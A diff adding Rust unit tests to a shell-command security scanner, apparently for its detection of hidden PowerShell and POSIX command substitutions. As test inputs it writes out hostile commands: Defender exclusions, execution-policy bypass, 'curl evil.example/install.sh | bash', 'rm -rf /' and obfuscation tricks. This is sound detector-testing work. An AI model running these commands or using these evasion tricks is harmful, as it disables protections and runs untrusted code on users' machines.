+                "$items.Where{ Set-ExecutionPolicy Bypass }",
+                "Set-ExecutionPolicy Bypass",
+            ),
+            (
+                "$items.PSForEach(({ Add-MpPreference -ExclusionProcess malware.exe }))",
+                "Add-MpPreference -ExclusionProcess malware.exe",
+            ),
+            (
+                "$items.PSWhere({ Set-ExecutionPolicy Unrestricted }, 'First', 1)",
+                "Set-ExecutionPolicy Unrestricted",
+            ),
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+            assert!(
+                scan.bodies.iter().any(|body| body.input.trim() == expected),
+                "collection ScriptBlock was not recovered exactly: {input:?} -> {scan:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn dynamic_powershell_collection_scriptblock_consumers_fail_closed() {
+        for input in [
+            "$items.ForEach($block)",
+            "$items.Where((Get-Variable block -ValueOnly))",
+            "$items.PSForEach([scriptblock]::Create($code))",
+            "$items.PSWhere($predicate)",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousPowerShellInvocation),
+                "{input:?} -> {scan:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn powershell_collection_property_overloads_and_quoted_decoys_remain_inert() {
+        for input in [
+            "$items.ForEach('Length')",
+            "$items.ForEach(\"Length\")",
+            "$items.PSForEach([string])",
+            "'$items.Where({ Add-MpPreference -ExclusionPath C:\\Temp })'",
+            "\"$items.ForEach({ Set-ExecutionPolicy Bypass })\"",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(scan.bodies.is_empty(), "{input:?} -> {scan:?}");
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+        }
+
+        let expanded = executable_substitution_scan(
+            "$items.ForEach(\"$(Add-MpPreference -ExclusionPath C:\\\\Temp)\")",
+            ShellType::PowerShell,
+        );
+        assert!(
+            expanded
+                .bodies
+                .iter()
+                .any(|body| body.input.contains("Add-MpPreference -ExclusionPath")),
+            "executable property-name subexpression was skipped: {expanded:?}"
+        );
+    }
+
+    #[test]
+    fn powershell_no_space_iex_recovers_literals_and_gaps_dynamic_values() {
+        for (input, expected) in [
+            (
+                "iex('Set-ExecutionPolicy Bypass')",
+                "Set-ExecutionPolicy Bypass",
+            ),
+            (
+                "Invoke-Expression(\"Add-MpPreference -ExclusionPath C:\\Temp\")",
+                "Add-MpPreference -ExclusionPath C:\\Temp",
+            ),
+            ("i`e`x('Write-Output safe')", "Write-Output safe"),
+            ("iex 'Write-Output spaced'", "Write-Output spaced"),
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+            assert!(
+                scan.bodies.iter().any(|body| body.input.trim() == expected),
+                "Invoke-Expression literal was not recovered exactly: {input:?} -> {scan:?}"
+            );
+        }
+
+        for input in [
+            "iex($payload)",
+            "Invoke-Expression((Get-Content .\\payload.ps1))",
+            "iex(\"$(Get-Content .\\payload.ps1)\")",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "{input:?} -> {scan:?}"
+            );
+        }
+
+        for input in [
+            "'iex(''Set-ExecutionPolicy Bypass'')'",
+            "Write-Output 'iex(''Set-ExecutionPolicy Bypass'')'",
+            "\"iex('Set-ExecutionPolicy Bypass')\"",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(scan.bodies.is_empty(), "{input:?} -> {scan:?}");
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+        }
+    }
+
+    #[test]
+    fn dynamic_powershell_scriptblock_consumers_fail_closed() {
+        for input in [
+            "$block = { Add-MpPreference -ExclusionPath C:\\Temp }; $block.Invoke()",
+            "$block.InvokeWithContext($null, @(), @())",
+            "Invoke-Command -ScriptBlock $block",
+            "Invoke-Command -Sc $block",
+            "icm -EA Stop -NoN $block",
+            "Invoke-Command -S $block",
+            "Start-Job $block",
+            "Start-Job -Sc $block",
+            "sajb -Command $block",
+            "1 | ForEach-Object $block",
+            "1 | ForEach-Object -Par $block",
+            "1 | where $block",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(scan.gap.is_some(), "{input:?} -> {scan:?}");
+        }
+    }
+
+    #[test]
+    fn powershell_scriptblock_invoke_methods_accept_unicode_whitespace() {
+        for input in [
+            "{ Add-MpPreference -ExclusionPath C:\\Temp }\u{00a0}.Invoke\u{2003}()",
+            "{ Add-MpPreference -ExclusionPath C:\\Temp }\u{202f}.InvokeReturnAsIs\u{205f}()",
+            "{ Add-MpPreference -ExclusionPath C:\\Temp }\u{3000}.InvokeWithContext\u{1680}($null, @(), @())",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+            assert_eq!(scan.bodies.len(), 1, "{input:?} -> {scan:?}");
+            assert!(
+                scan.bodies[0]
+                    .input
+                    .trim_start()
+                    .starts_with("Add-MpPreference"),
+                "{input:?} -> {scan:?}"
+            );
+        }
+
+        let zero_width = executable_substitution_scan(
+            "{ Add-MpPreference -ExclusionPath C:\\Temp }\u{200b}.Invoke()",
+            ShellType::PowerShell,
+        );
+        assert!(zero_width.gap.is_none(), "{zero_width:?}");
+        assert!(
+            zero_width.bodies.is_empty(),
+            "a zero-width character is not PowerShell whitespace: {zero_width:?}"
+        );
+    }
+
+    #[test]
+    fn powershell_parameter_prefixes_bind_scriptblocks_and_scopes() {
+        let scope = |command: &str, args: &[&str]| {
+            powershell_scriptblock_scope(
+                command,
+                &args
+                    .iter()
+                    .map(|arg| (*arg).to_string())
+                    .collect::<Vec<_>>(),
+            )
+        };
+
+        assert!(matches!(
+            scope("icm", &["-NoN", "{", "Write-Output", "safe", "}"]),
+            PowerShellScriptblockScope::Current
+        ));
+        assert!(matches!(
+            scope("icm", &["-NoN:$true", "{", "Write-Output", "safe", "}"]),
+            PowerShellScriptblockScope::Current
+        ));
+        assert!(matches!(
+            scope("icm", &["-NoN:$false", "{", "Write-Output", "safe", "}"]),
+            PowerShellScriptblockScope::Child
+        ));
+        assert!(matches!(
+            scope("icm", &["-NoN:$flag", "{", "Write-Output", "safe", "}"]),
+            PowerShellScriptblockScope::Ambiguous
+        ));
+        assert!(matches!(
+            scope("invoke-command", &["-S", "{", "Write-Output", "safe", "}"]),
+            PowerShellScriptblockScope::Ambiguous
+        ));
+        assert!(matches!(
+            scope("icm", &["-CN", "server", "{", "Write-Output", "safe", "}"]),
+            PowerShellScriptblockScope::Isolated
+        ));
+        assert!(matches!(
+            scope(
+                "foreach-object",
+                &["-Parallel", "{", "Write-Output", "safe", "}"]
+            ),
+            PowerShellScriptblockScope::Isolated
+        ));
+        assert!(matches!(
+            scope("%", &["-Par", "{", "Write-Output", "safe", "}"]),
+            PowerShellScriptblockScope::Isolated
+        ));
+        assert!(matches!(
+            scope("foreach-object", &["-P", "{", "Write-Output", "safe", "}"]),
+            PowerShellScriptblockScope::Ambiguous
+        ));
+
+        for input in [
+            "1 | where { Add-MpPreference -ExclusionPath C:\\Temp }",
+            "1 | ForEach-Object -Par { Add-MpPreference -ExclusionPath C:\\Temp }",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(
+                scan.bodies
+                    .iter()
+                    .any(|body| body.input.contains("Add-MpPreference")),
+                "static ScriptBlock was not recovered: {input:?} -> {scan:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn unicode_parameter_dashes_bind_dispatch_paths_scopes_and_continuations() {
+        for dash in ['\u{2013}', '\u{2014}', '\u{2015}'] {
+            let alias_args = vec![
+                format!("{dash}Name"),
+                "Evil".to_string(),
+                format!("{dash}Value"),
+                "Add-MpPreference".to_string(),
+            ];
+            assert_eq!(
+                powershell_alias_definition(&alias_args),
+                Some(("evil".to_string(), Some("Add-MpPreference".to_string())))
+            );
+
+            let provider_args = vec![
+                format!("{dash}Path:Alias:Evil"),
+                format!("{dash}Value"),
+                "Add-MpPreference".to_string(),
+            ];
+            assert_eq!(
+                powershell_provider_path_arguments("set-item", &provider_args),
+                Ok(vec!["Alias:Evil".to_string()]),
+                "attached path was sliced using normalized rather than raw offsets"
+            );
+
+            let location_args = vec![format!("{dash}Path:Function:")];
+            assert!(matches!(
+                powershell_location_transition("set-location", &location_args, false),
+                PowerShellLocationTransition::Set(Some(true))
+            ));
+
+            let parent_scope_args = vec![format!("{dash}Scope:Global")];
+            assert!(powershell_args_select_parent_scope(
+                "set-alias",
+                &parent_scope_args
+            ));
+
+            let current_scope_args = vec![
+                format!("{dash}NoN"),
+                "{".to_string(),
+                "Write-Output".to_string(),
+                "safe".to_string(),
+                "}".to_string(),
+            ];
+            assert!(matches!(
+                powershell_scriptblock_scope("icm", &current_scope_args),
+                PowerShellScriptblockScope::Current
+            ));
+
+            let isolated_scope_args = vec![
+                format!("{dash}Par"),
+                "{".to_string(),
+                "Write-Output".to_string(),
+                "safe".to_string(),
+                "}".to_string(),
+            ];
+            assert!(matches!(
+                powershell_scriptblock_scope("%", &isolated_scope_args),
+                PowerShellScriptblockScope::Isolated
+            ));
+
+            let continued_path = vec![
+                "Alias:Evil,".to_string(),
+                format!("{dash}Value"),
+                "Add-MpPreference".to_string(),
+            ];
+            assert!(
+                powershell_path_values_from_args(&continued_path, 0).is_err(),
+                "a Unicode parameter dash was consumed as a continued path value"
+            );
+        }
+    }
+
+    #[test]
+    fn powershell_dispatch_boundary_regressions_cover_strings_paths_locations_and_scopes() {
+        for input in [
+            "'Set-Alias Evil Invoke-Expression'",
+            "\"pwsh\" -Command 'Add-MpPreference -ExclusionPath C:\\Temp'",
+            "‘Set-Item Function:Evil’",
+            "$holder = { $Function:Evil = { Add-MpPreference -ExclusionPath C:\\Temp } }",
+            "$x = '$Function:Evil = { Add-MpPreference }'",
+            "Set-Item Env:NOTE $value -Verbose -EA Stop -OV out",
+            "Set-Content -Path:'Env:NOTE,Function:Evil' safe -Debug:$false -WI",
+            "Remove-Item C:\\Temp\\x -WhatIf -InformationAction Continue",
+            "icm -NoNewScope:$false { function Local { Write-Output safe } }",
+            "sajb { Add-MpPreference -ExclusionPath C:\\Temp }",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(
+                scan.gap.is_none(),
+                "safe data/control gapped: {input:?} -> {scan:?}"
+            );
+        }
+
+        let expandable = executable_substitution_scan(
+            "“safe $(Add-MpPreference -ExclusionPath C:\\Temp)”",
+            ShellType::PowerShell,
+        );
+        assert!(
+            expandable
+                .bodies
+                .iter()
+                .any(|body| body.input.contains("Add-MpPreference")),
+            "{expandable:?}"
+        );
+        let inert = executable_substitution_scan(
+            "‘$(Add-MpPreference -ExclusionPath C:\\Temp)’",
+            ShellType::PowerShell,
+        );
+        assert!(inert.bodies.is_empty(), "{inert:?}");
+        assert!(inert.gap.is_none(), "{inert:?}");
+
+        for input in [
+            "Set-Content Function::Evil { Add-MpPreference -ExclusionPath C:\\Temp }",
+            "sc Microsoft.PowerShell.Core\\Function::global:Evil { Add-MpPreference -ExclusionPath C:\\Temp }",
+            "Set-Item -Path Env:NOTE, Function::Evil -Value { Add-MpPreference -ExclusionPath C:\\Temp }",
+            "Set-Item -Path ('Function:' + 'Evil') -Value safe",
+            "Set-Location Function:; Set-Location child; New-Item Evil -Value safe",
+            "Set-Location Function:; Set-Location -StackName X; New-Item Evil -Value safe",
+            "'Function:' | Set-Location; New-Item Evil -Value safe",
+            "Set-Location +; New-Item Evil -Value safe",
+            "function Wrapper { Set-Location Function: }; Wrapper",
+            "$x = $Function:Evil = { Add-MpPreference -ExclusionPath C:\\Temp }",
+            "$x=$Function:global:Evil={ Add-MpPreference -ExclusionPath C:\\Temp }",
+            "$Alias:Evil ??= 'Invoke-Expression'",
+            "${Function:script:Evil}??={ Add-MpPreference -ExclusionPath C:\\Temp }",
+            "Set-Item Function:\\Global:Evil safe",
+            "Set-Item Function:1:Evil safe",
+            "Set-Alias Evil Write-Output -S 1",
+            "icm -NoNewScope:$true { Set-Alias Evil Invoke-Expression }; Evil 'Add-MpPreference -ExclusionPath C:\\Temp'",
+            "icm -NoNewScope:$flag { Set-Alias Evil Invoke-Expression }",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::PowerShell);
+            assert!(scan.gap.is_some(), "dispatch mutation did not fail closed: {input:?} -> {scan:?}");
+        }
+    }
+
+    #[test]
+    fn powershell_here_strings_preserve_literal_data_and_recover_expansions() {
+        for (open, close) in [
+            ('"', '"'),
+            ('\u{201c}', '\u{201d}'),
+            ('\u{201d}', '\u{201e}'),
+        ] {
+            let input = format!(
+                "Write-Output @{open} \t\r\nliteral {close} }} ; $(Add-MpPreference -ExclusionPath C:\\Temp)\r\n{close}@"
+            );
+            let scan = executable_substitution_scan(&input, ShellType::PowerShell);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+            assert!(
+                scan.bodies
+                    .iter()
+                    .any(|body| body.input.trim_start().starts_with("Add-MpPreference")),
+                "expandable here-string body was not recovered: {input:?} -> {scan:?}"
+            );
+        }
+
+        for (open, close) in [
+            ('\'', '\''),
+            ('\u{2018}', '\u{2019}'),
+            ('\u{201b}', '\u{201a}'),
+        ] {
+            let input = format!(
+                "Write-Output @{open} \t\n$(Add-MpPreference -ExclusionPath C:\\Temp)\n{close}@"
+            );
+            let scan = executable_substitution_scan(&input, ShellType::PowerShell);
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
+            assert!(
+                scan.bodies
+                    .iter()
+                    .all(|body| !body.input.contains("Add-MpPreference")),
+                "single-quoted here-string data executed: {input:?} -> {scan:?}"
+            );
+        }
+
+        let cr_expandable = executable_substitution_scan(
+            "Write-Output @\"\r$(Add-MpPreference -ExclusionPath C:\\Temp)\r\"@",
+            ShellType::PowerShell,
+        );
+        assert!(cr_expandable.gap.is_none(), "{cr_expandable:?}");
+        assert!(cr_expandable
+            .bodies
+            .iter()
+            .any(|body| body.input.trim_start().starts_with("Add-MpPreference")));
+
+        let cr_literal = executable_substitution_scan(
+            "Write-Output @'\r$(Add-MpPreference -ExclusionPath C:\\Temp)\r'@",
+            ShellType::PowerShell,
+        );
+        assert!(cr_literal.gap.is_none(), "{cr_literal:?}");
+        assert!(cr_literal
+            .bodies
+            .iter()
+            .all(|body| !body.input.contains("Add-MpPreference")));
+
+        let escaped = executable_substitution_scan(
+            "Write-Output @\"\n`$(Add-MpPreference -ExclusionPath C:\\Temp)\n\"@",
+            ShellType::PowerShell,
+        );
+        assert!(escaped.gap.is_none(), "{escaped:?}");
+        assert!(escaped.bodies.is_empty(), "{escaped:?}");
+
+        let assigned = executable_substitution_scan(
+            "$value=@\u{201c} \t\nsmart \u{201d} literal } ; $(Add-MpPreference -ExclusionPath C:\\Temp)\n\u{201d}@",
+            ShellType::PowerShell,
+        );
+        assert!(assigned.gap.is_none(), "{assigned:?}");
+        assert!(assigned
+            .bodies
+            .iter()
+            .any(|body| body.input.trim_start().starts_with("Add-MpPreference")));
+
+        let scriptblock = executable_substitution_scan(
+            "& { Write-Output @\u{201c} \t\nsmart \u{201d} literal } ; $(Add-MpPreference -ExclusionPath C:\\Temp)\n\u{201d}@\n}",
+            ShellType::PowerShell,
+        );
+        assert!(scriptblock.gap.is_none(), "{scriptblock:?}");
+        let scriptblock_body = scriptblock
+            .bodies
+            .iter()
+            .find(|body| body.input.contains("Write-Output @\u{201c}"))
+            .expect("complete scriptblock body");
+        assert!(scriptblock_body.input.contains("smart \u{201d} literal }"));
+        let nested = executable_substitution_scan(&scriptblock_body.input, ShellType::PowerShell);
+        assert!(nested.gap.is_none(), "{nested:?}");
+        assert!(
+            nested
+                .bodies
+                .iter()
+                .any(|body| body.input.trim_start().starts_with("Add-MpPreference")),
+            "scriptblock here-string expansion was not recovered: {nested:?}"
+        );
+
+        let switch = executable_substitution_scan(
+            "switch (1) { @\u{201c} \t\n$(Add-MpPreference -ExclusionPath C:\\Temp)\n\u{201d}@ { Write-Output safe } }",
+            ShellType::PowerShell,
+        );
+        assert!(switch.gap.is_none(), "{switch:?}");
+        assert!(
+            switch
+                .bodies
+                .iter()
+                .any(|body| body.input.trim_start().starts_with("Add-MpPreference")),
+            "switch-label here-string expansion was not recovered: {switch:?}"
+        );
+    }
+
+    #[test]
+    fn powershell_stop_parsing_uses_the_full_double_quote_class() {
+        for (open, close) in [
+            ('"', '"'),
+            ('\u{201c}', '\u{201d}'),
+            ('\u{201e}', '\u{201c}'),
+        ] {
+            let source = format!(
+                "{{ native.exe --% {open}literal | && }}{close} && Add-MpPreference -ExclusionPath C:\\Temp }}"
+            );
+            assert_eq!(
+                find_shell_delimiter_close(&source, 0, ShellType::PowerShell),
+                Some(source.len() - 1),
+                "ASCII/smart stop-parsing behavior diverged: {source:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn powershell_cr_only_boundaries_resume_comments_stop_parsing_and_switch_scans() {
+        for source in [
+            "{ Write-Output safe # fake }\rAdd-MpPreference -ExclusionPath C:\\Temp }",
+            "{ native.exe --% literal } ; fake\rAdd-MpPreference -ExclusionPath C:\\Temp }",
+        ] {
+            assert_eq!(
+                find_shell_delimiter_close(source, 0, ShellType::PowerShell),
+                Some(source.len() - 1),
+                "CR-only boundary did not resume delimiter parsing: {source:?}"
+            );
+        }
+
+        let switch = executable_substitution_scan(
+            "switch (1) { 1 # fake }\r { Add-MpPreference -ExclusionPath C:\\Temp } }",
+            ShellType::PowerShell,
+        );
+        assert!(switch.gap.is_none(), "{switch:?}");
+        assert!(
+            switch
+                .bodies
+                .iter()
+                .any(|body| body.input.trim_start().starts_with("Add-MpPreference")),
+            "switch action after a CR-only comment was not recovered: {switch:?}"
+        );
+
+        let mut fragment = ExecutableSubstitutionScan::default();
+        scan_powershell_fragment(
+            "# $(Write-Output decoy)\r$(Add-MpPreference -ExclusionPath C:\\Temp)",
+            &mut fragment,
+        );
+        assert!(fragment.gap.is_none(), "{fragment:?}");
+        assert!(fragment
+            .bodies
+            .iter()
+            .any(|body| body.input.trim_start().starts_with("Add-MpPreference")));
+        assert!(fragment
+            .bodies
+            .iter()
+            .all(|body| !body.input.contains("Write-Output decoy")));
+    }
+
+    #[test]
+    fn powershell_token_boundaries_match_comment_quote_and_stop_parsing_grammar() {
+        for input in [
+            "Write-Output x\"y\"#z; Add-MpPreference -ExclusionPath C:\\Temp",
+            "Write-Output foo` #bar; Add-MpPreference -ExclusionPath C:\\Temp",
+            "Write-Output foo<#unterminated; Add-MpPreference -ExclusionPath C:\\Temp",
+            "native.exe --%foo & Add-MpPreference -ExclusionPath C:\\Temp",
+            "native.exe --%foo && Add-MpPreference -ExclusionPath C:\\Temp",
+        ] {
+            let segments = tokenize::tokenize(input, ShellType::PowerShell);
+            assert!(
+                segments.iter().any(|segment| {
+                    segment.command.as_deref().is_some_and(|command| {
+                        crate::rules::command::normalize_cmd_base(command, ShellType::PowerShell)
+                            == "add-mppreference"
+                    })
+                }),
+                "real suffix was hidden: {input:?} -> {segments:?}"
+            );
+        }
+
+        let incomplete = executable_substitution_scan(
+            "& { Write-Output \"x\"# comment containing }; Add-MpPreference -ExclusionPath C:\\Temp",
+            ShellType::PowerShell,
+        );
+        assert!(
+            incomplete.gap.is_some(),
+            "comment text closed a script block: {incomplete:?}"
+        );
+    }
+
+    #[test]
+    fn posix_dispatch_edge_regressions_preserve_exact_bash_grammar() {
+        for input in [
+            "helper(){ printf safe; }; if true; then helper; fi",
+            "shopt -s expand_aliases\nalias helper='printf safe'\nif true; then helper; fi",
+            "helper(){ bash -c 'printf safe'; }; printf data | helper",
+            "helper(){ bash -sc ':'; }; printf data | helper",
+            "helper(){ printf safe; }; helper | bash -c 'printf safe'",
+            "helper(){ bash -c 'cat >/dev/null'; }; printf BENIGN | helper",
+            "helper(){ python3 -c 'print(1)'; }; printf data | helper",
+            "helper(){ python3 safe.py; }; printf data | helper",
+            "helper(){ printf : | bash; }; printf data | helper",
+            "fn(){ :; }; /usr/bin/time -p fn",
+            "fn(){ :; }; printf x | time -p fn",
+            "fn(){ :; }; X=1 time -p fn",
+            "fn(){ :; }; 'time' -p fn",
+            "fn(){ :; }; \\time -p fn",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(
+                scan.gap.is_none(),
+                "safe POSIX control gapped: {input:?} -> {scan:?}"
+            );
+        }
+
+        for input in [
+            "helper(){ bash; }; printf 'printf DANGER\\n' | helper",
+            "p=/dev/fd/0; helper(){ . \"$p\"; }; printf 'printf DYNAMIC\\n' | helper",
+            "helper(){ printf 'printf DOWNSTREAM\\n'; }; helper | source /dev//stdin",
+            "helper(){ bash -c 'source /dev/fd/00'; }; printf code | helper",
+            "helper(){ python3 -c 'import sys; exec(sys.stdin.read())'; }; printf code | helper",
+            "helper(){ python3 -c 'vars(__builtins__)[\"ex\"+\"ec\"](open(0).read())'; }; printf code | helper",
+            "helper(){ cat | bash; }; printf code | helper",
+            "sink(){ bash; }; printf code | &>/dev/null sink",
+            "sink(){ bash; }; printf code | &>>/dev/null sink",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(
+                scan.gap.is_some(),
+                "pipeline code path stayed open: {input:?} -> {scan:?}"
+            );
+        }
+
+        for input in [
+            "si\\\nnk(){ bash; }; printf code | sink",
+            "function si\\\nnk { bash; }; printf code | sink",
+            "func\\\ntion sink { bash; }; printf code | sink",
+            "function sink\u{00a0} { bash; }; printf code | sink\u{00a0}",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(
+                scan.gap.is_some(),
+                "continued/NBSP function was not recovered: {input:?} -> {scan:?}"
+            );
+        }
+
+        for input in [
+            "shopt -s expand_aliases\nalias sink=bash\nalias alias=:\nalias sink=cat\nprintf code | sink",
+            "shopt -s expand_aliases\nalias sink=bash\nalias unalias=:\nunalias sink\nprintf code | sink",
+            "alias sink=bash\nenable -n alias\nalias sink=cat\nprintf code | sink",
+            "sink(){ bash; }; alias unset=:\nunset -f sink\nprintf code | sink",
+            "sink(){ bash; }; alias command=:\ncommand unset -f sink\nprintf code | sink",
+            "sink(){ bash; }; command(){ :; }; command unset -f sink\nprintf code | sink",
+            "sink(){ bash; }; enable -n unset; unset -f sink; printf code | sink",
+            "sink(){ cat; }; env readonly -f sink; sink(){ bash; }; printf code | sink",
+            "sink(){ cat; }; nohup readonly -f sink; sink(){ bash; }; printf code | sink",
+            "sink(){ cat; }; /usr/bin/time readonly -f sink; sink(){ bash; }; printf code | sink",
+            "sink(){ cat; }; sudo readonly -f sink; sink(){ bash; }; printf code | sink",
+            "sink(){ cat; }; env unset -f sink; sink(){ bash; }; printf code | sink",
+            "alias sink=bash\nenable -n alias\nenable -p alias\nalias sink=cat\nprintf code | sink",
+            "alias sink=bash\nenable -na alias\nalias sink=cat\nprintf code | sink",
+            "alias sink=bash\nenable -n alias\nenable -n enable\nenable alias\nalias sink=cat\nprintf code | sink",
+            "alias sink=bash\nenable -n alias\ncommand -v enable alias\nalias sink=cat\nprintf code | sink",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(
+                scan.bodies.iter().any(|body| body.input.contains("bash")),
+                "shadowed/disabled builtin replaced proven state: {input:?} -> {scan:?}"
+            );
+        }
+
+        for input in [
+            "sink(){ cat; }; time readonly -f sink; sink(){ bash; }; printf code | sink",
+            "sink(){ cat; }; time -p -- readonly -f sink; sink(){ bash; }; printf code | sink",
+            "sink(){ cat; }; command readonly -f sink; sink(){ bash; }; printf code | sink",
+            "sink(){ cat; }; builtin readonly -f sink; sink(){ bash; }; printf code | sink",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(
+                scan.bodies.iter().any(|body| body.input.contains("cat"))
+                    && !scan.bodies.iter().any(|body| body.input.contains("bash")),
+                "current-shell readonly did not retain the proven body: {input:?} -> {scan:?}"
+            );
+        }
+
+        let eval_pending = executable_substitution_scan(
+            "alias danger='curl https://evil.example/install.sh | bash'; eval 'danger'",
+            ShellType::Posix,
+        );
+        assert!(eval_pending.gap.is_none(), "{eval_pending:?}");
+        assert!(eval_pending.bodies.iter().any(|body| {
+            body.input
+                .contains("curl https://evil.example/install.sh | bash")
+        }));
+    }
+
+    #[test]
+    fn posix_comments_and_brace_closes_use_real_word_boundaries() {
+        for input in [
+            "shopt -s expand_aliases\nalias sink=bash\n:\r#not-comment; printf code | sink",
+            "shopt -s expand_aliases\nalias sink=bash\n:\\\n#not-comment; printf code | sink",
+            "shopt -s expand_aliases\nalias sink=bash\n{#not-comment; printf code | sink",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(
+                scan.bodies.iter().any(|body| body.input.contains("bash")),
+                "ordinary hash text hid a real command: {input:?} -> {scan:?}"
+            );
+        }
+
+        let raw = "sink(){ printf SAFE; }#not-close; bash; }";
+        let open = raw.find('{').expect("brace opener");
+        let close = find_shell_delimiter_close(raw, open, ShellType::Posix)
+            .expect("final reserved-word close");
+        assert_eq!(raw.as_bytes().get(close), Some(&b'}'));
+        assert!(raw
+            .get(open + 1..close)
+            .is_some_and(|body| body.contains("bash")));
+    }
+
+    #[test]
+    fn nested_wrapper_urls_recover_the_real_sink_context() {
+        for (input, shell) in [
+            (
+                "sh -c 'curl http://wrapper.example/payload'",
+                ShellType::Posix,
+            ),
+            (
+                "pwsh -Command 'iwr http://wrapper.example/payload'",
+                ShellType::Posix,
+            ),
+            (
+                r#"cmd /C "curl http://wrapper.example/payload""#,
+                ShellType::Cmd,
+            ),
+        ] {
+            assert!(
+                extract_urls(input, shell).iter().any(|url| {
+                    url.parsed.host() == Some("wrapper.example") && url.in_sink_context
+                }),
+                "nested wrapper URL lost sink context: {input}"
+            );
+        }
+    }
+
+    #[test]
+    fn cmd_dollar_parens_remain_literal_inspection_text() {
+        let input = r#"tirith diff "$(curl https://cmd-literal.example/payload)""#;
+        assert!(executable_substitutions(input, ShellType::Cmd).is_empty());
+        assert!(tirith_inert_arg_range(input, ShellType::Cmd).is_some());
+        assert!(extract_urls(input, ShellType::Cmd).is_empty());
+    }
+
+    #[test]
+    fn posix_function_bodies_are_only_analyzed_after_invocation() {
+        for (definition, expected_url) in [
+            (
+                "safe(){ curl https://brace-function.example/payload; }",
+                "brace-function.example",
+            ),
+            (
+                "safe() ( curl https://paren-function.example/payload )",
+                "paren-function.example",
+            ),
+        ] {
+            assert!(
+                executable_substitutions(definition, ShellType::Posix).is_empty(),
+                "definition-only body was treated as executed: {definition}"
+            );
+
+            let invoked = format!("{definition}; safe");
+            let bodies = executable_substitutions(&invoked, ShellType::Posix);
+            assert!(
+                bodies.iter().any(|body| {
+                    extract_urls(body, ShellType::Posix)
+                        .iter()
+                        .any(|url| url.in_sink_context && url.parsed.host() == Some(expected_url))
+                }),
+                "invoked function body did not reach source analysis: {bodies:?}"
+            );
+        }
+
+        let env = std::collections::HashMap::new();
+        let dormant =
+            crate::blast_radius::cheap_check("danger(){ rm -rf /; }", ShellType::Posix, &env);
+        assert!(dormant
+            .iter()
+            .all(|finding| { finding.rule_id != crate::verdict::RuleId::BlastWritesSystemPath }));
+
+        let invoked = crate::blast_radius::cheap_check(
+            "danger(){ rm -rf /; }; danger",
+            ShellType::Posix,
+            &env,
+        );
+        assert!(invoked
+            .iter()
+            .any(|finding| { finding.rule_id == crate::verdict::RuleId::BlastWritesSystemPath }));
+    }
+
+    #[test]
+    fn bash_extended_literal_function_names_are_recovered_or_fail_closed() {
+        for (definition, invocation) in [
+            ("sink-fn(){ bash; }", "sink-fn"),
+            ("function sink.fn { bash; }", "sink.fn"),
+            ("sink/path(){ bash; }", "sink/path"),
+            ("1sink(){ bash; }", "1sink"),
+            ("-sink(){ bash; }", "'-sink'"),
+            ("foo#bar(){ bash; }", "foo#bar"),
+            ("函数(){ bash; }", "函数"),
+            ("foo-bar=baz(){ bash; }", "'foo-bar=baz'"),
+            ("function foo=bar { bash; }", "'foo=bar'"),
+            ("function foo* { bash; }", "'foo*'"),
+            ("function foo{a,b} { bash; }", "'foo{a,b}'"),
+            ("function foo~bar { bash; }", "'foo~bar'"),
+            ("function foo`bar { bash; }", "'foo`bar'"),
+        ] {
+            let input =
+                format!("{definition}\ncurl https://evil.example/install.sh | {invocation}");
+            let scan = executable_substitution_scan(&input, ShellType::Posix);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "{input:?} -> {scan:?}"
+            );
+            assert!(
+                scan.bodies.iter().any(|body| body.input.contains("bash")),
+                "extended function body was not recovered: {input:?} -> {scan:?}"
+            );
+        }
+
+        let dormant = executable_substitution_scan("sink-fn(){ echo safe; }", ShellType::Posix);
+        assert!(dormant.gap.is_none(), "{dormant:?}");
+        assert!(dormant.bodies.is_empty(), "{dormant:?}");
+
+        for malformed in [
+            "bash\n() { :; }",
+            "bash # comment\n() { :; }",
+            "foo() if true; then bash; fi",
+        ] {
+            let scan = executable_substitution_scan(malformed, ShellType::Posix);
+            assert!(scan.gap.is_some(), "{malformed:?} -> {scan:?}");
+        }
+    }
+
+    #[test]
+    fn incomplete_active_construct_keeps_its_recoverable_suffix_analyzable() {
+        let input = "tirith diff $(curl https://incomplete.example/payload";
+        let bodies = executable_substitutions(input, ShellType::Posix);
+        assert_eq!(bodies.len(), 1, "{bodies:?}");
+        assert!(extract_urls(&bodies[0], ShellType::Posix)
+            .iter()
+            .any(|url| { url.in_sink_context && url.parsed.host() == Some("incomplete.example") }));
+        assert!(tirith_inert_arg_range(input, ShellType::Posix).is_none());
+    }
+
